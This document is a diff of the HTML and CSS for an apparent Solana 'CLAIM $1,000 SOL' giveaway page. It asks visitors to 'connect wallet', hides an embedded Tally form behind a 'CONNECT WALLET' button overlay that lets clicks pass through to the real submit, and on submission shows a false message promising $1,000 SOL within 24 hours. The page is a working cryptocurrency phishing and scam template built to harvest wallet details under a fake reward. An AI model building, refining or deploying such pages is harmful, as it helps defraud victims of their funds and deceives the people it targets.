@@ -8,122 +8,89 @@
     <style>
         :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
         
-        body { 
-            margin: 0; 
-            background: radial-gradient(circle at center, #0a0a0a 0%, #000 100%);
-            color: #fff; 
-            font-family: 'Space Grotesk', sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            overflow: hidden; 
-        }
+        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
 
         .card { 
             width: 90%; 
             max-width: 440px; 
-            background: rgba(12, 12, 12, 0.98); 
+            background: #080808; 
             border: 1px solid rgba(0, 255, 163, 0.2); 
-            border-radius: 50px; 
-            padding: 55px 30px; 
+            border-radius: 40px; 
+            padding: 50px 25px; 
             text-align: center; 
-            box-shadow: 0 0 100px rgba(0, 255, 163, 0.08);
-            position: relative;
+            box-shadow: 0 0 80px rgba(0, 0, 0, 1);
         }
 
         h1 { 
             font-family: 'Syncopate', sans-serif; 
-            font-size: 1.7rem; 
+            font-size: 1.5rem; 
             margin-bottom: 25px; 
             background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
             -webkit-background-clip: text; 
             -webkit-text-fill-color: transparent; 
-            letter-spacing: -1px;
             text-transform: uppercase;
         }
 
-        /* Unified Header Style for both lines */
-        .neon-text {
+        .neon-label {
             color: var(--sol-g);
             font-family: 'Syncopate', sans-serif;
-            font-size: 0.85rem;
-            letter-spacing: 4px;
-            margin-bottom: 12px;
+            font-size: 0.8rem;
+            letter-spacing: 3px;
             display: block;
-            text-transform: uppercase;
-            text-shadow: 0 0 12px rgba(0, 255, 163, 0.4);
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(0, 255, 163, 0.3);
         }
 
-        .instruction { margin-bottom: 30px; font-size: 0.75rem; opacity: 0.9; }
-
-        /* REFINED FORM CONTAINER */
-        .form-stage {
+        /* TALLY BOX AREA */
+        .tally-box-area {
             position: relative;
             width: 100%;
-            height: 220px; /* Reduced height to keep button close to input */
-            overflow: hidden;
-            border-radius: 25px;
-            background: rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.05);
+            min-height: 280px; /* Enough space for box + button */
+            margin-top: 10px;
         }
 
         iframe {
             width: 100%;
-            height: 400px;
+            height: 350px;
             border: none !important;
-            position: absolute;
-            top: -22px; /* Adjusted to bring the input box into view */
-            left: 0;
-            z-index: 1;
         }
 
-        /* CENTERED BUTTON MASK */
-        .connect-btn {
+        /* THE BIG BUTTON OVERLAY */
+        .btn-mask {
             position: absolute;
-            bottom: 20px; /* Sits perfectly at the bottom of the visible stage */
-            left: 50%;
-            transform: translateX(-50%);
+            bottom: 40px; /* Sits over the Tally submit */
+            left: 5%;
             width: 90%;
             padding: 22px 0;
             background: linear-gradient(135deg, var(--sol-g), var(--sol-p));
             color: #fff;
             font-family: 'Syncopate', sans-serif;
             font-weight: 700;
-            font-size: 0.85rem;
-            border-radius: 20px;
-            pointer-events: none; 
-            box-shadow: 0 12px 35px rgba(0, 255, 163, 0.25);
+            font-size: 0.8rem;
+            border-radius: 15px;
+            pointer-events: none; /* Let clicks hit the real button underneath */
             z-index: 10;
-            text-transform: uppercase;
+            box-shadow: 0 10px 30px rgba(0, 255, 163, 0.2);
         }
 
         /* SUCCESS VIEW */
         #success-view { display: none; }
-        .success-h { font-size: 2.2rem !important; color: var(--sol-g); margin-bottom: 30px; }
-        .congrats-box { 
-            font-size: 1.25rem; padding: 40px; border: 1px solid rgba(0, 255, 163, 0.3); 
-            border-radius: 40px; background: rgba(0, 255, 163, 0.03); line-height: 1.8;
-        }
-
-        b { color: var(--sol-g); }
+        .success-h { color: var(--sol-g); font-family: 'Syncopate', sans-serif; font-size: 1.5rem; margin-bottom: 20px; }
+        .congrats { padding: 30px; border: 1px dashed var(--sol-g); border-radius: 20px; background: rgba(0, 255, 163, 0.05); line-height: 1.6; font-size: 1.1rem; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <!-- CLAIM VIEW -->
+        <!-- CLAIM SECTION -->
         <div id="form-view">
             <h1>CLAIM $1,000 SOL</h1>
-            
-            <span class="neon-text">SOLANA123</span>
-            <span class="neon-text instruction">CONNECT WALLET TO RECEIVE REWARDS</span>
+            <span class="neon-label">SOLANA123</span>
+            <span class="neon-label" style="font-size: 0.65rem; opacity: 0.7;">Connect wallet to receive rewards</span>
 
-            <div class="form-stage">
-                <!-- Large Custom Button -->
-                <div class="connect-btn">CONNECT WALLET</div>
-                
-                <!-- Tally Input (Layered Underneath) -->
+            <div class="tally-box-area">
+                <div class="btn-mask">CONNECT WALLET</div>
+                <!-- Tally Iframe: No extra masking, so the box shows clearly -->
                 <iframe 
                     data-tally-src="https://tally.so" 
                     loading="lazy">
@@ -131,10 +98,10 @@
             </div>
         </div>
 
-        <!-- SUCCESS VIEW -->
+        <!-- SUCCESS SECTION -->
         <div id="success-view">
             <h1 class="success-h">CLAIM SUCCESSFUL</h1>
-            <div class="congrats-box">
+            <div class="congrats">
                 Congrats, you have claimed <b>$1,000 SOL</b> and you’ll receive the <b>$1,000 SOL</b> to your wallet address within 24 hrs.
             </div>
         </div>
@@ -142,13 +109,12 @@
 
     <script async src="https://tally.so"></script>
     <script>
-        // Detection for Tally submission
-        window.addEventListener('message', (e) => {
+        window.onmessage = (e) => {
             if (e.data && e.data.includes('Tally.FormSubmitted')) {
                 document.getElementById('form-view').style.display = 'none';
                 document.getElementById('success-view').style.display = 'block';
             }
-        });
+        };
     </script>
 </body>
 </html>
